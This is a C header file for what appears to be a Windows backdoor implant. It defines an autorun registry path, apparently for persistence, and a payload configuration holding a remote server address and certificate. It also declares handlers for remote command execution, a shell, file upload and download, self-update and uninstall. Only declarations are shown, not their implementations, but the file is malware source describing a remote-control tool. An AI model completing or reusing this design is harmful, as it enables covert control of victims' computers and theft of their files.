
#define MAX_ADDR_LEN 0x20
#define MAX_CONF_SIZE 0x600

#define CLIENT_SESSION_KEY_BITS 128
#define CLIENT_SESSION_KEY_SIZE (CLIENT_SESSION_KEY_BITS / 8)

#define AUTORUN_KEY_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define PAYLOAD_KEY_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer"

typedef struct _PAYLOAD_CONFIG
{
    char szRemoteAddress[MAX_ADDR_LEN];
    WORD RemotePort;
    char Certificate[MAX_CONF_SIZE - MAX_ADDR_LEN - sizeof(WORD)];

} PAYLOAD_CONFIG,
*PPAYLOAD_CONFIG;

#include <PshPack1.h>

typedef struct _REQUEST_AUTH
{
    DWORD dwVersion;
    UCHAR Digest[CERTIFICATE_DIGEST_SIZE];
    UCHAR Key[CLIENT_SESSION_KEY_SIZE];

} REQUEST_AUTH,
*PREQUEST_AUTH;

#include <PopPack.h>

#define CMD_OK      0
#define CMD_RESET   1
#define CMD_EXIT    2

#define CMD_NO_CLOSE 0x80000000

typedef DWORD (* PAYLOAD_COMMAND_HANDLER)(SOCKET s, char *lpszArgs);

typedef struct _PAYLOAD_COMMAND
{
    char *lpszCommand;
    PAYLOAD_COMMAND_HANDLER Handler;

} PAYLOAD_COMMAND,
*PPAYLOAD_COMMAND;

DWORD CommandId(SOCKET s, char *lpszArgs);
DWORD CommandInfo(SOCKET s, char *lpszArgs);
DWORD CommandPing(SOCKET s, char *lpszArgs);
DWORD CommandExec(SOCKET s, char *lpszArgs);
DWORD CommandExit(SOCKET s, char *lpszArgs);
DWORD CommandUpd(SOCKET s, char *lpszArgs);
DWORD CommandUninst(SOCKET s, char *lpszArgs);
DWORD CommandShell(SOCKET s, char *lpszArgs);
DWORD CommandFileList(SOCKET s, char *lpszArgs); 
DWORD CommandFileGet(SOCKET s, char *lpszArgs);
DWORD CommandFilePut(SOCKET s, char *lpszArgs);

DWORD ResolveHostname(char *lpszHostname);
